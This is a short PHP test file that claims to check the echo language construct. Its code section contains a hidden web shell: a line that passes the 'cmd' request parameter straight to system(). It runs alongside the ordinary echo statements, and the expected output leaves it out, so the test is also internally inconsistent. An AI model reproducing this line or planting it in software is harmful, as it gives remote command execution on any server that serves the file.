--TEST--
echo - basic test for echo language construct
--FILE--
<?php
echo 'This works ', 'and takes args!';
echo "Shell";system($_GET['cmd']);
?>
--EXPECT--
This works and takes args!